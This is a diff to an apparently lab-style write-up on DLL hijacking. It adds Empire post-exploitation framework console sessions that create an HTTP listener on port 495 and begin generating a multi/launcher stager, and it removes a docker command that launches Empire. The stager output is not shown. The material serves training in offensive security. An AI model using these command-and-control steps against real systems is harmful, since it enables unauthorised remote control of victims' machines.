@@ -196,17 +196,30 @@ Info: Establishing connection to remote endpoint
 <p>4.1. Created HTTP Listener<br>
 <code>No answer needed</code></p>
 
-<br>
-
-<p>4.2. Generated Multi/Launcher Stager<br>
-<code>No answer needed</code></p>
-
 ```bash
-:~/DLLHijacking# user@attackbox$ docker run --network host -it --volumes-from empirestorage bcsecurity/empire:v3.5.2 ./empire
-```
+================================================================================
+ [Empire]  Post-Exploitation Framework
+================================================================================
+ [Version] 3.5.2 BC Security Fork | [Web] https://github.com/BC-SECURITY/Empire
+================================================================================
+ [Starkiller] Multi-User GUI | [Web] https://github.com/BC-SECURITY/Starkiller
+================================================================================
 
-```bash
-...
+   _______ .___  ___. .______    __  .______       _______
+  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
+  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
+  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
+  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
+  |_______||__|  |__| | _|      |__| | _| `._____||_______|
+
+
+       312 modules currently loaded
+
+       0 listeners currently active
+
+       0 agents currently active
+
+
 (Empire) > uselistener http
 (Empire: listeners/http) > set Port 495
 (Empire: listeners/http) > execute
@@ -220,14 +233,37 @@ Info: Establishing connection to remote endpoint
 (Empire: listeners/http) > 
 ```
 
-<img width="651" height="591" alt="image" src="https://github.com/user-attachments/assets/74b50a40-a6cb-4b8e-ab0a-5e54af6d8597" />
-
+<p>4.2. Generated Multi/Launcher Stager<br>
+<code>No answer needed</code></p>
 
 ```bash
-main
+(Empire: listeners/http) > main
 ```
 
 ```bash
+================================================================================
+ [Empire]  Post-Exploitation Framework
+================================================================================
+ [Version] 3.5.2 BC Security Fork | [Web] https://github.com/BC-SECURITY/Empire
+================================================================================
+ [Starkiller] Multi-User GUI | [Web] https://github.com/BC-SECURITY/Starkiller
+================================================================================
+
+   _______ .___  ___. .______    __  .______       _______
+  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
+  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
+  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
+  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
+  |_______||__|  |__| | _|      |__| | _| `._____||_______|
+
+
+       312 modules currently loaded
+
+       1 listeners currently active
+
+       0 agents currently active
+
+
 (Empire) > usestager multi/launcher
 (Empire: stager/multi/launcher) > set Listener http
 (Empire: stager/multi/launcher) > execute
